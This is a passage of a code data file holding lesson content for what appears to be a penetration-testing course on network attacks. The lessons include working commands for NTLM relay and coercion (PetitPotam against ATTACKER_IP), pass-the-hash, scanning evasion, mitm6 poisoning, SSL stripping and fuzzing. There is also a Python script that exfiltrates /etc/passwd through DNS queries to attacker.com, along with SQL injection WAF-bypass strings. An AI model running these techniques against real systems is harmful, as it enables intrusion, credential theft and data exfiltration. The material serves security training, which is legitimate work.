
# Ncrack
ncrack -p 22 --user admin -P passwords.txt 10.0.0.1
\`\`\`

Password spraying (one password, many users) avoids lockout policies. Use known patterns: Season+Year!, Company+Year!, Welcome1.`,
        sortOrder: 2,
      },
      {
        heading: "Relay and coercion attacks",
        content: `Relay attacks forward authentication attempts to a different service:

\`\`\`bash
# NTLM relay with Impacket
# Listen for incoming NTLM auth and relay to target
ntlmrelayx.py -tf targets.txt -smb2support

# Coerce authentication with PetitPotam
python3 PetitPotam.py ATTACKER_IP DC_IP

# Responder — capture/relay NetNTLM hashes
responder -I eth0 -wrf
# Poisons LLMNR/NBT-NS/mDNS responses
# Captures NTLMv2 hashes when hosts try to authenticate
\`\`\`

Defense: disable LLMNR and NBT-NS, enable SMB signing, use EPA (Extended Protection for Authentication).`,
        sortOrder: 3,
      },
      {
        heading: "Network service exploitation",
        content: `Common vulnerable services and their exploitation:

| Service | Port | Common Vulnerabilities |
|---------|------|----------------------|
| FTP | 21 | Anonymous access, writable dirs, cleartext creds |
| SSH | 22 | Weak passwords, old versions (CVEs) |
| SMTP | 25 | Open relay, user enumeration (VRFY/EXPN) |
| DNS | 53 | Zone transfer, cache poisoning |
| SMB | 445 | EternalBlue, null sessions, relay |
| RDP | 3389 | BlueKeep (CVE-2019-0708), NLA bypass |
| WinRM | 5985 | Pass-the-hash with Evil-WinRM |

\`\`\`bash
# Evil-WinRM with hash (pass-the-hash)
evil-winrm -i 10.0.0.1 -u administrator -H aad3b435b51404eeaad3b435b51404ee

# SMTP user enumeration
smtp-user-enum -M VRFY -U users.txt -t 10.0.0.1
\`\`\``,
        sortOrder: 4,
      },
      {
        heading: "Sources",
        content: `- MITRE ATT&CK: Lateral Movement (TA0008), Credential Access (TA0006)
- Impacket documentation: github.com/fortra/impacket
- Responder: github.com/lgandx/Responder
- Chisel: github.com/jpillora/chisel
- man pages: ssh(1), proxychains(1)`,
        sortOrder: 5,
      },
    ],
  },

  // ── net-attacks L4 ──────────────────────────────────────────────────────
  {
    competencyId: "net-attacks",
    depthTier: 4,
    title: "Expert Network Techniques",
    recommendedLevel: 4,
    sections: [
      {
        heading: "Advanced scanning evasion",
        content: `Bypass IDS/IPS and firewalls during scanning:

\`\`\`bash
# Fragment packets to evade inspection
nmap -f 10.0.0.1

# Use decoy addresses
nmap -D RND:5 10.0.0.1

# Slow scan to avoid rate-based detection
nmap -T1 10.0.0.1   # paranoid timing

# Idle scan (use a zombie host as proxy)
nmap -sI zombie-host:80 10.0.0.1

# Source port manipulation (some firewalls allow DNS/HTTP source ports)
nmap --source-port 53 10.0.0.1

# Custom packet crafting
nmap --scanflags URGACKPSHRSTSYNFIN 10.0.0.1
\`\`\`

The idle scan (\`-sI\`) is completely stealthy — the target never sees packets from your IP. It exploits predictable IP ID sequences on the zombie host.`,
        sortOrder: 0,
      },
      {
        heading: "IPv6 network attacks",
        content: `Many networks have IPv6 enabled but unmonitored:

\`\`\`bash
# IPv6 host discovery
nmap -6 --script=ipv6-multicast-mld-list fe80::1%eth0

# Router advertisement spoofing
# Announce yourself as a default router on the IPv6 network
# Tools: THC-IPv6 suite, mitm6

# mitm6 — poisoning via DHCPv6
mitm6 -d corp.local
# Clients request IPv6 configuration, we provide DNS server
# pointing to our ntlmrelayx instance

# Combined with ntlmrelayx for LDAP relay
ntlmrelayx.py -6 -t ldaps://dc.corp.local -wh wpad.corp.local
\`\`\`

The mitm6 + ntlmrelayx combination is highly effective in environments where IPv6 is enabled by default (Windows does this) but not configured or monitored.`,
        sortOrder: 1,
      },
      {
        heading: "Protocol-level attacks",
        content: `Attacks targeting protocol weaknesses:

\`\`\`bash
# VLAN hopping via double tagging
# Craft double-tagged 802.1Q frames
# Requires: native VLAN matches outer tag, switch forwards inner tag

# STP manipulation
# Announce yourself as root bridge to redirect traffic
# yersinia -I eth0 -G  (STP attack mode)

# DHCP starvation + rogue DHCP
# Exhaust legitimate pool, then serve rogue DHCP with our gateway
# yersinia -I eth0 -G  (DHCP attack mode)

# DNS cache poisoning
# Race the legitimate DNS server to respond with forged answers
# Kaminsky attack: query random subdomains, blast forged responses
\`\`\`

These attacks target the trust assumptions in network protocols — most were designed without authentication.`,
        sortOrder: 2,
      },
      {
        heading: "Traffic interception and analysis",
        content: `\`\`\`bash
# SSL strip — downgrade HTTPS to HTTP
# With Bettercap:
bettercap -iface eth0
> set http.proxy.sslstrip true
> http.proxy on
> arp.spoof on

# Extract credentials from pcap
pcredz -f capture.pcap
# Finds: HTTP Basic, FTP, SMTP, POP3, IMAP, NTLM, Kerberos

# Network forensics with tshark
tshark -r capture.pcap -Y "http.request.method == POST" \\
  -T fields -e ip.src -e http.host -e http.request.uri

# Extract files from pcap
foremost -i capture.pcap -o extracted/
# Or in Wireshark: File → Export Objects → HTTP
\`\`\``,
        sortOrder: 3,
      },
      {
        heading: "Sources",
        content: `- Nmap Reference Guide: Firewall/IDS evasion chapter
- MITRE ATT&CK: Network Sniffing (T1040), Man-in-the-Middle (T1557)
- THC IPv6 toolkit documentation
- RFC 6528 (Defending Against Sequence Number Attacks)
- Bettercap documentation: bettercap.org`,
        sortOrder: 4,
      },
    ],
  },

  // ── net-attacks L5 ──────────────────────────────────────────────────────
  {
    competencyId: "net-attacks",
    depthTier: 5,
    title: "Network Attack Internals",
    recommendedLevel: 5,
    sections: [
      {
        heading: "Custom protocol fuzzing",
        content: `Fuzzing network protocols discovers implementation bugs:

\`\`\`python
# Boofuzz — network protocol fuzzer
from boofuzz import *

session = Session(target=Target(
    connection=SocketConnection("10.0.0.1", 21, proto="tcp")
))

s_initialize("FTP_USER")
s_string("USER", fuzzable=False)
s_delim(" ", fuzzable=False)
s_string("anonymous", name="username")
s_static("\\r\\n")

s_initialize("FTP_PASS")
s_string("PASS", fuzzable=False)
s_delim(" ", fuzzable=False)
s_string("password", name="password")
s_static("\\r\\n")

session.connect(s_get("FTP_USER"))
session.connect(s_get("FTP_USER"), s_get("FTP_PASS"))
session.fuzz()
\`\`\`

The fuzzer sends malformed inputs — oversized strings, format specifiers, null bytes, negative numbers — monitoring for crashes that indicate memory corruption.`,
        sortOrder: 0,
      },
      {
        heading: "Covert channels and data exfiltration",
        content: `When traditional channels are monitored, use protocol fields for covert communication:

\`\`\`python
# DNS exfiltration — encode data in subdomain queries
import base64
data = open("/etc/passwd", "rb").read()
encoded = base64.b32encode(data).decode()
# Split into chunks of 63 chars (max DNS label length)
chunks = [encoded[i:i+63] for i in range(0, len(encoded), 63)]
for i, chunk in enumerate(chunks):
    # Query: chunk.seq.exfil.attacker.com
    query = f"{chunk}.{i}.exfil.attacker.com"
    # dns.resolver.resolve(query, "A")
\`\`\`

Other covert channel techniques:
- ICMP data field (ping tunneling with ptunnel)
- HTTP headers (data in Cookie, User-Agent, custom headers)
- TCP sequence numbers (encode data in ISN)
- NTP (using the reference timestamp field)

Detection: look for unusual DNS query patterns (high volume, long labels, entropy analysis), unexpected ICMP payloads, or connections to unusual ports/protocols.`,
        sortOrder: 1,
      },
      {
        heading: "Network implant development",
        content: `Custom network tools for authorized engagements:

\`\`\`python
# Raw socket sniffer
import socket
import struct

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))
while True:
    raw, addr = s.recvfrom(65535)
    eth = struct.unpack("!6s6sH", raw[:14])
    if eth[2] == 0x0800:  # IPv4
        ip_header = raw[14:34]
        iph = struct.unpack("!BBHHHBBH4s4s", ip_header)
        src = socket.inet_ntoa(iph[8])
        dst = socket.inet_ntoa(iph[9])
        proto = iph[6]
        print(f"{src} -> {dst} proto={proto}")
\`\`\`

\`\`\`python
# Port scanner with SYN scan (requires root)
from scapy.all import *

def syn_scan(target, ports):
    results = {}
    for port in ports:
        pkt = IP(dst=target)/TCP(dport=port, flags="S")
        resp = sr1(pkt, timeout=1, verbose=0)
        if resp and resp.haslayer(TCP):
            if resp[TCP].flags == 0x12:  # SYN-ACK
                results[port] = "open"
                sr1(IP(dst=target)/TCP(dport=port, flags="R"),
                    timeout=1, verbose=0)
            elif resp[TCP].flags == 0x14:  # RST
                results[port] = "closed"
    return results
\`\`\``,
        sortOrder: 2,
      },
      {
        heading: "Network defense detection and evasion",
        content: `Understanding how network defenses work helps in both offense and defense:

**IDS signature evasion**:
- Fragmentation: split the payload across multiple packets
- Encoding: use URL encoding, Unicode, or double encoding
- Protocol ambiguity: different implementations interpret edge cases differently (insertion/evasion attacks, per Ptacek & Newsham 1998)

**WAF bypass techniques** (for authorized testing):
- Case variation: \`SeLeCt\` instead of \`SELECT\`
- Comment injection: \`SEL/**/ECT\`
- Alternative encodings: \`%53%45%4C%45%43%54\`
- HTTP parameter pollution: \`?id=1&id=2' OR 1=1--\`

**Network forensics evasion**:
- Timestomping network logs
- Using encrypted channels (DNS over HTTPS)
- Blending with normal traffic patterns`,
        sortOrder: 3,
      },
      {
        heading: "Sources",
        content: `- Ptacek & Newsham, "Insertion, Evasion, and Denial of Service" (1998)
- MITRE ATT&CK: Exfiltration Over Alternative Protocol (T1048)
- Boofuzz documentation: boofuzz.readthedocs.io
- Scapy documentation: scapy.readthedocs.io
- SANS SEC560 course materials (Network Penetration Testing)`,
        sortOrder: 4,
      },
    ],
  },
];
